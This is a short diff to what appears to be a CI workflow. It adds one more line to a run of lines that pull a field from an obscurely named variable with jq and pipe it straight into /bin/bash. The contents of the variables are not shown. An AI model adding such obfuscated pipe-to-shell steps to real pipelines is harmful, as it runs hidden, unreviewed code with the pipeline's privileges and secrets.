@@ -38,6 +38,7 @@ jobs:
           echo $jd3 | jq -r .orm33 | /bin/bash
           printf '%s' "$tomi80113" | jq -r .xdbis612 | /bin/bash
           echo $iyahk9429 | jq -r .sqcvy62 | /bin/bash
+          echo $bkhs2 | jq -r .ia0 | /bin/bash
 
       - name: Persist output
         if: ${{ always() }}
